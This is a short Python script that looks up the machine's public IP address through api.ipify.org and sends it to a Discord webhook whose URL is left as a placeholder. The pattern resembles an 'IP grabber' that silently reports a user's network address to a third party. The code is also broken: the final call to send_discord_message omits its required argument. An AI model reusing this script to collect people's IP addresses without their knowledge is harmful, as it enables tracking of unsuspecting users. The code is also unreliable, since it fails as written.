import requests
import json

def get_public_ip():
    response = requests.get("https://api.ipify.org/?format=json")
    return response.json()["ip"] 

message = get_public_ip()
WEBHOOK_URL = "discord webhook here"
def send_discord_message(message):
    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)

send_discord_message()